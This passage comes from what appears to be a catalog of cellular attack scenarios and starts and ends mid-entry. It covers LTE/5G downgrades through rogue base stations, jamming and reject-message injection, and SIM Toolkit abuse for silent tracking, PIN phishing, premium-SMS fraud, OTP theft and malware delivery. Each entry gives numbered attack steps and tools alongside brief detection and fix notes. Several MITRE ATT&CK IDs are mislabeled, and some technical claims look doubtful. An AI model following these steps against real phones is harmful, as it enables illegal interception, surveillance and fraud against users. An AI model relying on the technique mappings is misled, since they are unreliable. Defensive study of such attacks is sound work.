- **Solution**: Use Release 15+ SIMs with SUCI encryption, 5G SA only mode
- **Tags**: IMSI Catcher, 5G, SUCI

## LTE to 2G MITM via Fake PLMN Override

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: Smartphone with custom SIM
- **Vulnerability**: Custom SIMs override operator lock-in
- **MITRE**: T1431
- **Impact**: Full traffic interception
- **Tools**: USRP, OpenBTS, Custom SIM
- **Scenario**: The attacker tricks the device to connect to a fake operator by overriding PLMN tables.
- **Attack Steps**: Step 1: Craft a programmable SIM card to accept any PLMN.Step 2: Broadcast rogue LTE tower with fake PLMN using srsRAN.Step 3: Force detach victim from LTE by broadcasting invalid tracking area.Step 4: Device reselects to 2G due to no matching LTE coverage.Step 5: Launch rogue 2G tower with OpenBTS accepting all connections.Step 6: Act as MITM to intercept and forward traffic.Step 7: Log all call, SMS, and data activity from victim.
- **Detection**: SIM & device logs show PLMN mismatch
- **Solution**: Lock SIM to allow specific PLMNs only, force LTE-only mode
- **Tags**: Fake PLMN, 2G Interception

## 5G to LTE Downgrade via Reject Cause Manipulation

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: Smartphone
- **Vulnerability**: Improper reject cause validation
- **MITRE**: T1431
- **Impact**: IMSI leakage, forced fallback
- **Tools**: Amarisoft, USRP, SrsRAN
- **Scenario**: Attacker simulates a 5G base station and injects fake reject messages to force fallback to LTE.
- **Attack Steps**: Step 1: Set up a fake 5G base station using Amarisoft Callbox or SDR.Step 2: Broadcast same PLMN ID as the legitimate carrier to attract UEs.Step 3: Accept initial UE registration attempts and immediately respond with a “Service Not Allowed” reject cause.Step 4: UE will assume network problem and fall back to LTE.Step 5: Start a rogue LTE eNodeB with SrsRAN and accept the fallback.Step 6: Capture cleartext IMSI before encryption handshake.Step 7: Log IMSI and map it to physical identity if available.
- **Detection**: Monitor network reject cause patterns using PCAP analysis
- **Solution**: Enforce 5G SA usage and reject 4G fallback via policy
- **Tags**: 5G Downgrade, IMSI, Reject Injection

## LTE to 2G Downgrade with Jamming Support

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: Older 2G-capable phone
- **Vulnerability**: No fallback control + jamming
- **MITRE**: T1431 + T1464
- **Impact**: Call interception, IMSI tracking
- **Tools**: HackRF One, GNU Radio, OpenBTS
- **Scenario**: Attacker jams LTE/3G bands and broadcasts fake 2G to force older device fallback.
- **Attack Steps**: Step 1: Use HackRF and GNU Radio to jam LTE and 3G frequencies.Step 2: As LTE becomes unreachable, the device searches for the next network—2G.Step 3: Launch a rogue 2G base station using OpenBTS.Step 4: Accept any connection attempt and disable encryption.Step 5: Intercept voice calls and SMS in plain text.Step 6: Optionally forward calls/data to avoid suspicion.Step 7: Log victim IMSI and track movements.
- **Detection**: RF sweep to detect jamming + rogue base
- **Solution**: Disable 2G fallback at carrier and device level
- **Tags**: GSM, Jamming, Fallback Exploit

## Downgrade Trigger via Fake Emergency Broadcast

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: Smartphone
- **Vulnerability**: Emergency fallback override
- **MITRE**: T1431
- **Impact**: Voice and SMS compromise
- **Tools**: SrsRAN, Custom Cell Broadcast Tool, USRP B200
- **Scenario**: Fake LTE cell sends emergency message that forces device to fallback to GSM-only mode.
- **Attack Steps**: Step 1: Deploy rogue LTE eNodeB using SrsRAN on matching carrier PLMN.Step 2: Broadcast cell information matching local region to gain trust.Step 3: Send a fake emergency Cell Broadcast indicating LTE/4G unavailable.Step 4: Device responds by triggering fallback mode to GSM-only.Step 5: Start rogue 2G tower using OpenBTS.Step 6: Accept any device and disable ciphering.Step 7: Intercept SMS, location updates, and calls.
- **Detection**: Look for unusual cell broadcasts and tower IDs
- **Solution**: Validate emergency alerts cryptographically
- **Tags**: CB Exploits, LTE Broadcast, GSM MITM

## SIM Profile Manipulation for Forced Downgrade

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: SIM-enabled phone
- **Vulnerability**: RAT priority in SIM can be altered
- **MITRE**: T1431
- **Impact**: Surveillance, location tracking
- **Tools**: SIM Cloning Tool, Programmable SIM Card, USRP
- **Scenario**: Attacker clones SIM profile with altered RAT preferences to trigger fallback to 3G/2G.
- **Attack Steps**: Step 1: Clone target SIM using SIMtrace or card reader.Step 2: Modify Access Technology Preference field in SIM EF files.Step 3: Write SIM to blank programmable SIM card.Step 4: Insert into test device or victim testbed.Step 5: When device boots, it avoids 5G/4G and registers to 2G.Step 6: Launch fake 2G BTS to accept connection and sniff traffic.Step 7: Capture IMSI and intercept calls/SMS.
- **Detection**: SIM inspection logs reveal altered profiles
- **Solution**: Lock SIM profiles at HLR/HSS level
- **Tags**: SIM, RAT Order, Programmable SIM

## eSIM Downgrade Attack Using Invalid Profiles

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: eSIM-enabled phones
- **Vulnerability**: eSIM profile validation failure
- **MITRE**: T1431
- **Impact**: Metadata leak, call/SMS exposure
- **Tools**: eSIM Provisioning Tools, QR Code Toolkits
- **Scenario**: eSIM is provisioned with an invalid LTE/5G profile, pushing device to use 3G/2G.
- **Attack Steps**: Step 1: Create an eSIM profile with invalid LTE/5G configuration.Step 2: Share via QR code to user or simulate OTA push.Step 3: Device downloads profile and activates it.Step 4: Device fails to attach to 5G/LTE and falls back to 3G.Step 5: Launch fake 3G tower and intercept traffic.Step 6: Monitor IMSI and send spoofed messages.Step 7: Use fallback to extract user metadata.
- **Detection**: Monitor provisioning events and profile integrity
- **Solution**: Enable eSIM certificate pinning & policy enforcement
- **Tags**: eSIM, QR, LTE Downgrade

## LTE Downgrade via Network Capability Downgrade Request

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: Smartphone
- **Vulnerability**: Capability exchange not authenticated
- **MITRE**: T1431
- **Impact**: Full device downgrade
- **Tools**: SrsRAN, USRP, ASN.1 Toolkit
- **Scenario**: Fake base station responds to UE with downgraded capability profile, excluding LTE/5G.
- **Attack Steps**: Step 1: Set up a fake LTE base station using SrsRAN.Step 2: Capture UE capability request messages (Device asks: what’s supported?).Step 3: Respond with a network configuration indicating no LTE/5G support.Step 4: UE assumes 2G/3G are only available and falls back.Step 5: Start rogue 2G/3G tower and accept connection.Step 6: Log IMSI, intercept unencrypted traffic.Step 7: Repeat for multiple UEs in area.
- **Detection**: Compare device logs with expected bands
- **Solution**: Verify network capabilities via SIM/app
- **Tags**: UE Capabilities, ASN.1, LTE

## 5G Downgrade via Fake SIB Broadcasting

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: 5G Phone
- **Vulnerability**: SIBs not cryptographically signed
- **MITRE**: T1431
- **Impact**: Priority misdirection, data theft
- **Tools**: Amarisoft, SDRPlay, GNURadio
- **Scenario**: Broadcasts fake 5G SIB (System Info Block) with untrusted data to influence device behavior.
- **Attack Steps**: Step 1: Configure Amarisoft to broadcast a fake SIB1 block for a 5G cell.Step 2: Manipulate cell reselection parameters to reduce cell priority.Step 3: UE interprets low priority and searches for LTE alternatives.Step 4: Start LTE rogue eNodeB to accept connections.Step 5: Extract IMSI from device prior to encryption.Step 6: Log and analyze connection behavior.
- **Detection**: RF scanner + SIB broadcast integrity check
- **Solution**: Verify SIB authenticity via cryptographic means
- **Tags**: SIB Spoofing, 5G

## Temporary Outage Simulation for LTE Downgrade

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: LTE Device
- **Vulnerability**: Core failure triggers fallback
- **MITRE**: T1431
- **Impact**: MITM via forced fallback
- **Tools**: SrsEPC, LTE EPC Emulator, USRP
- **Scenario**: Attacker simulates network outage in LTE using DoS on core, forcing device fallback.
- **Attack Steps**: Step 1: Set up LTE eNodeB and EPC emulator (SrsEPC).Step 2: Allow devices to connect and authenticate initially.Step 3: Kill S1 interface (simulate EPC failure).Step 4: Device experiences “No Service” for LTE and initiates fallback.Step 5: Start 3G/2G rogue base station.Step 6: Accept UE connection and disable encryption.Step 7: Sniff and log unprotected data.
- **Detection**: Network logs show disconnection from EPC
- **Solution**: Redundancy and fallback rate limits
- **Tags**: EPC, LTE, DoS

## RRC Reject with Implicit Fallback Path

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: Smartphone
- **Vulnerability**: Lack of fallback policy enforcement
- **MITRE**: T1431
- **Impact**: IMSI capture, fallback loop
- **Tools**: SrsRAN, RRC Manipulation Scripts
- **Scenario**: Device receives RRC Connection Reject and follows preconfigured fallback to 2G.
- **Attack Steps**: Step 1: Broadcast LTE signal using SrsRAN.Step 2: Accept RRC Connection Request.Step 3: Send RRC Connection Reject with no redirection indication.Step 4: Device assumes network error and follows implicit fallback to 2G.Step 5: Operate rogue 2G BTS and accept victim.Step 6: Record IMSI and extract call logs.Step 7: Replay to analyze device behavior.
- **Detection**: Monitor RRC behavior in logs
- **Solution**: Use secure fallback logic in UE firmware
- **Tags**: RRC Reject, LTE, Fallback

## Smartwatch 5G Downgrade Exploit

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: 5G Smartwatch
- **Vulnerability**: Smart wearables lack full network locking
- **MITRE**: T1431
- **Impact**: Tracking, metadata theft
- **Tools**: SrsRAN, eSIM Config Toolkit
- **Scenario**: Exploiting lack of 5G lock options in smartwatches to downgrade them via rogue LTE.
- **Attack Steps**: Step 1: Set up rogue LTE tower with high signal.Step 2: Broadcast matching PLMN ID to attract smartwatch.Step 3: Smartwatch auto-connects to LTE as it lacks full 5G SA support.Step 4: Accept connection before encryption begins.Step 5: Log IMSI and capture metadata (location, usage).Step 6: Use logs to simulate targeted phishing.Step 7: Repeat with other wearables.
- **Detection**: Track PLMN changes and RF logs
- **Solution**: Firmware update with 5G-only lock-in
- **Tags**: Smartwatch, LTE Downgrade

## LTE Downgrade Using TAU Reject Flood

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: Smartphone or LTE-capable IoT
- **Vulnerability**: Device fallback upon TAU rejection not verified securely
- **MITRE**: T1431 - Downgrade Attack
- **Impact**: IMSI exposure, surveillance
- **Tools**: srsRAN, USRP B210, Wireshark
- **Scenario**: The attacker repeatedly sends Tracking Area Update (TAU) reject messages to the target device, causing it to fall back to 2G/3G networks.
- **Attack Steps**: Step 1: Deploy a rogue LTE base station using srsRAN and a USRP B210 SDR device.Step 2: Configure the eNodeB to impersonate a valid mobile carrier by broadcasting a known PLMN.Step 3: Monitor for TAU (Tracking Area Update) requests from UEs (phones attempting to register on LTE).Step 4: Immediately respond to each TAU request with a “TAU Reject” message using cause “LTE service not allowed.”Step 5: After receiving repeated rejections, the device automatically falls back to legacy networks (3G or 2G).Step 6: Activate a rogue 2G BTS (using OpenBTS) to intercept the fallback connection.Step 7: Log the IMSI number and analyze incoming SMS, calls, or data from the victim device.
- **Detection**: Analyze mobile logs for repeated TAU rejects
- **Solution**: Patch device firmware to limit fallback behavior
- **Tags**: TAU, LTE, Fallback, IMSI

## 5G SA to NSA Downgrade via PLMN Priority Tampering

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: 5G Standalone Device
- **Vulnerability**: PLMN priority not authenticated
- **MITRE**: T1431
- **Impact**: Downgrade to NSA (vulnerable), IMSI theft
- **Tools**: Amarisoft Callbox, srsRAN, USRP
- **Scenario**: Attacker tricks a standalone 5G device into falling back to a vulnerable NSA mode using higher PLMN priority broadcasting.
- **Attack Steps**: Step 1: Set up a rogue 5G base station using Amarisoft configured to mimic a legitimate carrier.Step 2: Broadcast a PLMN with artificially high priority using the SIB1 system info block.Step 3: Device compares broadcasted PLMN priorities and prefers the attacker’s PLMN.Step 4: Since attacker base doesn’t support SA, device automatically tries to connect in NSA (non-standalone) mode, relying on LTE.Step 5: At this point, launch a rogue LTE eNodeB to serve as the LTE anchor.Step 6: Accept UE connection and intercept traffic prior to encryption negotiation.Step 7: Log IMSI and optionally perform MITM on calls or SMS.
- **Detection**: Check device logs for PLMN reselection anomalies
- **Solution**: Carrier SIM hardcodes PLMN selection
- **Tags**: NSA, 5G Downgrade, PLMN

## Emergency Call Only Trick for LTE Bypass

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: Any GSM-capable smartphone
- **Vulnerability**: Emergency-only fallback lacks encryption/auth
- **MITRE**: T1431
- **Impact**: Location tracking, IMSI interception
- **Tools**: SDR (HackRF), OpenBTS, GSM SIM cards
- **Scenario**: By simulating LTE unavailability, the attacker causes the device to enter emergency-call-only mode and connects it to a fake 2G tower.
- **Attack Steps**: Step 1: Use HackRF and GNU Radio to jam all LTE/5G frequencies locally (short duration, limited area).Step 2: The victim device, unable to find a suitable LTE/5G signal, enters “Emergency Calls Only” state.Step 3: In this state, the phone will accept any available GSM/2G tower broadcasting emergency support.Step 4: Deploy a rogue 2G BTS using OpenBTS that advertises “Emergency Support.”Step 5: Victim phone connects and begins signaling on 2G.Step 6: Attacker intercepts IMSI and optionally forwards any emergency call.Step 7: Log metadata or trace device movement across cells.
- **Detection**: RF spectrum sweep to detect jamming or fake towers
- **Solution**: Configure device to restrict fallback options
- **Tags**: GSM Emergency, Fallback, 2G MITM

## SIM Toolkit Abuse for Downgrade Trigger

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: SIM-capable phone (especially Android)
- **Vulnerability**: SIM Toolkit control not restricted on all carriers
- **MITRE**: T1431
- **Impact**: RAT priority override, IMSI collection
- **Tools**: Programmable SIM Card, SIMtrace2, Custom STK commands
- **Scenario**: Attacker sends a malicious SIM Toolkit command that alters network preference order and forces a downgrade.
- **Attack Steps**: Step 1: Modify a SIM card using programmable SIM tools (like MagicSIM) to embed a custom STK (SIM Toolkit) command.Step 2: Insert this SIM into the test device or supply via phishing (for advanced attackers).Step 3: STK triggers a “Refresh” command that updates the preferred RAT to 2G first, followed by 3G.Step 4: Device refreshes and attempts to reattach to network using new order.Step 5: Launch a rogue 2G BTS with matching MCC/MNC to accept fallback.Step 6: Capture IMSI and log messages from victim device.Step 7: Optionally simulate phishing or SMS spoofing post-connection.
- **Detection**: Monitor STK behavior using SIMtrace
- **Solution**: Restrict SIM commands via UICC policy
- **Tags**: STK, SIM RAT Control, MITM

## Forced ESM Reject Causing RAT Downgrade

- **Attack Type**: LTE/5G Downgrade Attack
- **Target**: Smartphone or LTE modem
- **Vulnerability**: Devices accept ESM reject at face value
- **MITRE**: T1431
- **Impact**: Voice/data interception, IMSI theft
- **Tools**: srsRAN, USRP, Wireshark
- **Scenario**: The attacker sends specific Evolved Session Management (ESM) reject messages during attach to prevent LTE registration and trigger downgrade.
- **Attack Steps**: Step 1: Launch rogue LTE base station with srsRAN and USRP, impersonating target carrier.Step 2: Accept initial attach request from UE (target device).Step 3: Send back an Attach Reject with ESM cause “PDN Connectivity Not Allowed.”Step 4: Device assumes LTE unavailable, seeks lower-generation fallback (3G/2G).Step 5: Broadcast a rogue 2G BTS using OpenBTS.Step 6: Accept the fallback attach and disable encryption.Step 7: Log traffic, monitor calls/SMS, and capture IMSI before encryption handshake.
- **Detection**: UE trace logs show ESM reject trends
- **Solution**: Device-side reject validation, carrier rat-lock policy
- **Tags**: ESM Reject, LTE Attach Denial

## Silent SMS Location Tracking via SIM Toolkit

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Mobile Phone
- **Vulnerability**: SIM processes silent SMS without consent
- **MITRE**: T1430 (Location Tracking via Cellular Network)
- **Impact**: Covert real-time tracking of victim
- **Tools**: SIMTester, USB Modem, silent SMS sender
- **Scenario**: An attacker silently sends special SMS to trigger SIM Toolkit to report device's location.
- **Attack Steps**: Step 1: The attacker gets a GSM modem and connects it to a PC.Step 2: Installs a tool like "SIMTester" to craft a special SMS (Silent SMS) that doesn't alert the user.Step 3: The SMS is sent to the victim's phone using GSM.Step 4: The victim’s SIM card processes it using SIM Toolkit and sends back location details.Step 5: The attacker receives a reply without the user knowing anything happened.
- **Detection**: Forensic analysis of SMS logs
- **Solution**: Carrier-level SIM filtering; disable SIM OTA capabilities
- **Tags**: SIM Toolkit, Silent SMS, Location

## Forced Call Forwarding via SIM Menu

- **Attack Type**: SIM Toolkit Abuse
- **Target**: SIM Card
- **Vulnerability**: Unauthenticated STK command execution
- **MITRE**: T1429 (Call Interception)
- **Impact**: Call interception, privacy violation
- **Tools**: SIM card reader/writer, SIMTrace2, OTA SMS editor
- **Scenario**: An attacker inserts malicious applet into SIM, rerouting calls silently.
- **Attack Steps**: Step 1: Attacker gets physical access to the SIM card.Step 2: Uses SIMTrace2 and card writer to install a custom STK applet.Step 3: Applet executes when phone is restarted and issues command to reroute all outgoing calls.Step 4: Calls are silently forwarded to attacker-controlled number.Step 5: Victim sees no alerts; attacker listens to redirected conversations.
- **Detection**: Unusual call forwarding records
- **Solution**: Use secure SIM OS, validate SIM STK apps via carrier
- **Tags**: SIM Toolkit, STK, Call Forwarding

## Phishing via SIM-Initiated STK Pop-ups

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Mobile User
- **Vulnerability**: Trust in SIM-based prompts
- **MITRE**: T1204.002 (User Execution via STK UI)
- **Impact**: Credential theft
- **Tools**: OTA SMS composer, programmable SIM, Wireshark
- **Scenario**: Attacker makes SIM Toolkit push fake pop-ups asking for personal info.
- **Attack Steps**: Step 1: Attacker sends OTA SMS that triggers SIM to show a prompt like “Verify your PIN to update your mobile plan.”Step 2: Victim enters PIN thinking it’s from the provider.Step 3: The applet captures the input and sends it to the attacker.Step 4: No visible app is involved; just native SIM interface.Step 5: Attacker collects PINs/passwords remotely.
- **Detection**: Manual SIM audit, STK UI logs
- **Solution**: Disable unverified STK UIs, OTA SMS integrity checks
- **Tags**: SIM Pop-up, Social Engineering, Phishing

## Browser Launch & Malicious Redirect via SIM Toolkit

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Smartphone
- **Vulnerability**: SIM auto-launches browser without user consent
- **MITRE**: T1216 (System Script Execution - Mobile)
- **Impact**: Phishing, data theft
- **Tools**: SIM card editor, OTA delivery platform, phishing page
- **Scenario**: SIM applet launches browser with malicious URL when user boots the phone.
- **Attack Steps**: Step 1: Attacker injects STK applet in SIM or delivers via OTA SMS.Step 2: When user turns on phone, SIM Toolkit applet triggers browser to open.Step 3: A fake banking login page loads automatically.Step 4: Victim may think it's their bank's login screen and enters credentials.Step 5: Attacker gets the submitted data on their server.
- **Detection**: Mobile DNS logs, browser history
- **Solution**: Disable STK-triggered browser events; whitelist safe STK actions
- **Tags**: STK, Browser, Redirect, Phishing

## Remote Data Exfiltration via STK SMS Channel

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Mobile Phone
- **Vulnerability**: Lack of SIM isolation from SMS commands
- **MITRE**: T1041 (Exfiltration Over Other Network Medium)
- **Impact**: Theft of personal data silently
- **Tools**: Programmable SIM, OTA SMS toolkit, GSM modem
- **Scenario**: Attacker sends SMS to SIM to exfiltrate device data silently.
- **Attack Steps**: Step 1: Attacker configures a SIM with a malicious applet programmed to respond to OTA SMS.Step 2: OTA SMS is sent remotely to the SIM in the victim’s phone.Step 3: SIM reads out contact list or SMS messages via Toolkit access.Step 4: Response is sent back to attacker as a normal SMS (but encoded).Step 5: Attacker decodes the reply and gets sensitive data without physical access.
- **Detection**: SMS traffic analysis, encoded SMS detection
- **Solution**: Disable STK OTA channels or restrict SIM access to local operations
- **Tags**: STK, OTA, SMS Data Theft

## Unauthorized Balance Depletion via SIM Menu

- **Attack Type**: SIM Toolkit Abuse
- **Target**: SIM Card
- **Vulnerability**: SIM executes commands without user awareness
- **MITRE**: T1470 (Input Capture - Mobile)
- **Impact**: Financial loss for victim
- **Tools**: Custom SIM applet, OTA update sender, GSM Modem
- **Scenario**: An attacker uses STK menu to silently send premium-rate SMS using victim's balance.
- **Attack Steps**: Step 1: Attacker modifies a SIM card or sends a special OTA command to add a new invisible menu in STK (SIM Toolkit).Step 2: When the SIM receives this command, it installs a hidden script that can be triggered silently or after a phone restart.Step 3: The malicious applet periodically sends SMS to premium-rate numbers without showing anything on screen.Step 4: Each message costs money deducted from the user’s mobile balance.Step 5: The user sees no SMS in the outbox or notifications.Step 6: Attacker receives a payout from the premium-rate service.
- **Detection**: Mobile operator logs, balance history audits
- **Solution**: Disable STK SMS sending permissions or use SIM cards with STK sandboxing
- **Tags**: STK, Premium SMS, SIM Abuse

## Fake Carrier Update Phishing via STK

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Mobile User
- **Vulnerability**: SIM STK can impersonate carrier messages
- **MITRE**: T1204.002 (Social Engineering via STK)
- **Impact**: SIM PIN exposure, account hijack
- **Tools**: OTA SMS composer, SIMTrace2, phishing server
- **Scenario**: SIM Toolkit used to push a fake "Carrier Settings Update" which captures user’s PIN.
- **Attack Steps**: Step 1: Attacker crafts a command using OTA SMS that prompts a message: "To complete network upgrade, enter your SIM PIN".Step 2: This message is sent over-the-air to the victim’s SIM card.Step 3: SIM Toolkit processes this as a valid request and displays it like a legitimate system prompt.Step 4: Victim thinks it's from their network provider and enters their PIN.Step 5: SIM Toolkit sends the PIN silently back to the attacker’s number encoded in SMS.Step 6: Attacker can now clone or abuse the SIM remotely.
- **Detection**: Unusual STK input requests in logs
- **Solution**: Block unauthorized OTA messages; use STK input filtering
- **Tags**: Phishing, SIM PIN, Fake Update

## Remote SIM Reset Trigger via SIM Toolkit

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Mobile Device
- **Vulnerability**: SIM can trigger device-level network actions
- **MITRE**: T1499 (Network Denial of Service)
- **Impact**: Network loss, preparation for larger attacks
- **Tools**: OTA SMS delivery tool, programmable SIM, GSM Modem
- **Scenario**: Attacker forces victim's phone to reset network settings using hidden STK command.
- **Attack Steps**: Step 1: Attacker sends OTA SMS with a command to trigger SIM Toolkit “refresh” event.Step 2: This refresh command is treated as a valid internal event by the SIM, causing it to send a reset instruction to the mobile device.Step 3: Phone temporarily loses connection, resets access point settings or disconnects from the network.Step 4: The device reinitializes its mobile settings, disrupting voice/data traffic.Step 5: If chained with other attacks, this can prep the phone for interception or denial of service.
- **Detection**: SIM Toolkit logs, crash logs in OS
- **Solution**: Harden SIM firmware against refresh loops; verify OTA origin
- **Tags**: Denial, Reset, OTA Abuse

## Remote IMEI Leak via STK Input Request

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Smartphone User
- **Vulnerability**: SIM prompts for sensitive info deceptively
- **MITRE**: T1583.005 (Obtain Device Identifier)
- **Impact**: Loss of IMEI, tracking or fraud setup
- **Tools**: OTA SMS manager, GSM Modem, STK editor
- **Scenario**: Attacker makes SIM prompt the victim for device IMEI and sends it back.
- **Attack Steps**: Step 1: Attacker uses OTA SMS to send a “Request Information” STK command.Step 2: The victim’s phone displays a message like “Network issue detected. Please confirm your phone ID.”Step 3: User unknowingly enters their IMEI or confirms a prompt that allows it to be sent.Step 4: The SIM applet sends this back in a covert SMS to attacker’s receiver.Step 5: IMEI is used later in clone/pretexting attacks.
- **Detection**: Monitor outbound SMS for encoded messages
- **Solution**: Restrict STK input types, validate OTA authenticity
- **Tags**: SIM Phishing, IMEI Leak

## STK Channel Overuse to Drain Battery

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Smartphone
- **Vulnerability**: SIM overuses communication channel
- **MITRE**: T1496 (Resource Hijacking - Mobile)
- **Impact**: Battery exhaustion, user frustration
- **Tools**: SIM Card script injector, OTA manager, diagnostic tools
- **Scenario**: Malicious SIM Toolkit script sends frequent network commands, draining battery quickly.
- **Attack Steps**: Step 1: Attacker embeds a STK applet into SIM or injects via OTA SMS.Step 2: Applet initiates frequent communication with mobile network, like continuous “refresh”, "proactive polling", or signal checks.Step 3: These repeated commands keep the baseband processor and antenna active.Step 4: Victim notices excessive battery drain without any apps showing abnormal behavior.Step 5: Attack continues silently unless SIM is removed or reset.
- **Detection**: Analyze STK logs or baseband wake-up frequency
- **Solution**: Limit STK execution frequency; set watchdog counters
- **Tags**: Battery Drain, STK Loop

## Dual SIM Cross-Channel Hijack via STK

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Dual SIM Phones
- **Vulnerability**: Poor STK isolation between SIM slots
- **MITRE**: T1412 (Input Capture via Dual-SIM Exploits)
- **Impact**: Call/message redirection
- **Tools**: SIM STK development kit, OTA broadcaster, dual-SIM testbed
- **Scenario**: Malicious SIM manipulates communication flow in dual-SIM phones.
- **Attack Steps**: Step 1: Attacker sends OTA payload to SIM in SIM1 slot of a dual-SIM phone.Step 2: The applet issued from SIM1 can request SIM2's state indirectly using shared resources (some vendors improperly isolate STKs).Step 3: Commands may override default SIM routing, causing traffic misdirection.Step 4: Calls or messages originally from SIM2 may be rerouted via SIM1’s STK control.Step 5: Attacker eavesdrops on the redirected traffic.
- **Detection**: Analyze SIM STK event chain, slot conflicts
- **Solution**: Enforce slot-level STK sandboxing
- **Tags**: Dual SIM, STK Isolation

## Covert App Installation via STK-triggered URL

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Android Devices
- **Vulnerability**: SIM triggers app download via browser
- **MITRE**: T1476 (Delivery via System Applets)
- **Impact**: Malware infection via trusted SIM
- **Tools**: OTA SMS crafting tool, STK applet builder, malicious APK
- **Scenario**: Attacker makes SIM launch browser and download malicious APK.
- **Attack Steps**: Step 1: Malicious OTA SMS installs a SIM Toolkit applet that uses LAUNCH_BROWSER STK command.Step 2: On device reboot or SIM refresh, browser auto-opens a download link.Step 3: Link hosts a malicious Android APK file.Step 4: Victim may be tricked to install the app thinking it’s an update or promo.Step 5: App has spyware/malware capabilities once installed.
- **Detection**: Proxy logs, unexpected browser activity
- **Solution**: Block STK browser launches; enforce install verification
- **Tags**: STK, Malware Delivery, APK

## SIM Toolkit Contact Extraction

- **Attack Type**: SIM Toolkit Abuse
- **Target**: SIM-enabled Phones
- **Vulnerability**: STK can access and read phonebook
- **MITRE**: T1083 (Data from Local System - Mobile)
- **Impact**: Contact theft, privacy invasion
- **Tools**: SIM reader/writer, OTA SMS control panel
- **Scenario**: STK applet secretly copies contact list and sends via SMS.
- **Attack Steps**: Step 1: Attacker injects applet using OTA or physical SIM access.Step 2: STK script reads phonebook using standard GSM access.Step 3: Extracted contacts are broken into multiple parts.Step 4: Encoded SMS messages are sent to attacker’s number in sequence.Step 5: Entire contact list is exfiltrated without user knowing.
- **Detection**: Analyze outbound SMS payloads
- **Solution**: Restrict SIM access to phonebook APIs
- **Tags**: SIM, Contact Exfiltration, STK

## STK Remote Call Trigger

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Smartphone
- **Vulnerability**: SIM-initiated call without confirmation
- **MITRE**: T1429 (Call Interception / Setup)
- **Impact**: Covert calls, billing loss
- **Tools**: OTA SMS command composer, GSM modem
- **Scenario**: Attacker forces SIM to auto-call a number silently.
- **Attack Steps**: Step 1: Attacker crafts an OTA message with the STK SETUP_CALL command.Step 2: This command instructs the SIM to initiate a call to a specific number.Step 3: When user unlocks phone or connects to network, the command triggers.Step 4: Phone silently dials the number (can be attacker’s IVR or premium line).Step 5: User may not notice or hang up in time.
- **Detection**: Call history analysis
- **Solution**: Require user confirmation for STK-triggered calls
- **Tags**: STK, Silent Call, Fraud

## Message Relay to External Server via SIM

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Mobile Phones
- **Vulnerability**: STK reads incoming SMS contents
- **MITRE**: T1040 (SMS Traffic Interception)
- **Impact**: Theft of OTPs, password resets
- **Tools**: SIM SDK, OTA SMS builder, fake relay number
- **Scenario**: SIM applet relays incoming SMS content to attacker server using STK commands.
- **Attack Steps**: Step 1: Attacker writes an STK applet to intercept incoming SMS.Step 2: When victim receives a text (e.g., OTP or sensitive info), SIM reads it.Step 3: Applet uses SMS or data channel to forward contents to attacker’s server.Step 4: This is done in background, victim sees nothing.Step 5: OTPs or codes meant for victim are stolen and abused.
- **Detection**: Monitor SIM's role in message handling
- **Solution**: Limit SIM access to SMS inbox; filter OTA installs
- **Tags**: STK, OTP Theft, Message Relay

## SIM Toolkit-Based Fake Recharge Scam

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Smartphone user
- **Vulnerability**: SIM STK impersonates official recharge features
- **MITRE**: T1204.002 (User Execution - Social Engineering)
- **Impact**: Recharge voucher theft
- **Tools**: OTA SMS toolkit, STK script editor
- **Scenario**: Attacker tricks victim into entering recharge voucher details via SIM pop-up and steals it.
- **Attack Steps**: Step 1: Attacker crafts an OTA SMS that installs a new STK applet with the title “Network Recharge Center”.Step 2: When the victim inserts the SIM or restarts the phone, the STK menu appears, displaying the fake option.Step 3: When the user selects it, they’re prompted: “Enter your recharge voucher to complete the bonus plan”.Step 4: Victim enters the recharge voucher (thinking it's real).Step 5: The STK applet sends the entered code to the attacker’s number via hidden SMS.Step 6: The attacker then uses this voucher on their own device or resells it.
- **Detection**: STK menu inspection, pattern SMS detection
- **Solution**: Enforce STK UI verification, block unauthorized OTA commands
- **Tags**: STK, Recharge Scam, Phishing

## STK Forced MMS Download of Malware

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Smartphone (especially older Androids)
- **Vulnerability**: SIM triggers unintended MMS fetches
- **MITRE**: T1476 (Malicious Media Delivery via STK)
- **Impact**: Device compromise, malware execution
- **Tools**: OTA SMS composer, SIM debugger, malicious MMS server
- **Scenario**: SIM triggers MMS auto-download containing spyware without any user input.
- **Attack Steps**: Step 1: Attacker installs a SIM applet or sends an OTA command that triggers SEND SHORT MESSAGE STK command to operator’s MMS service.Step 2: This message requests an MMS push that points to a malicious media file hosted on attacker’s server.Step 3: The mobile device receives the MMS and, based on default settings, auto-downloads the attachment.Step 4: The attachment may contain spyware or exploit-laced content.Step 5: The victim is unaware because the whole flow is silent and seems like a network-driven event.
- **Detection**: MMS logs, suspicious media analysis
- **Solution**: Disable MMS auto-download, validate STK requests to MMSC
- **Tags**: STK, MMS, Spyware

## SIM-Based Self-Destruct Trigger for Insider Threats

- **Attack Type**: SIM Toolkit Abuse
- **Target**: Enterprise-issued SIM device
- **Vulnerability**: SIM can autonomously trigger data wipes
- **MITRE**: T1485 (Data Destruction)
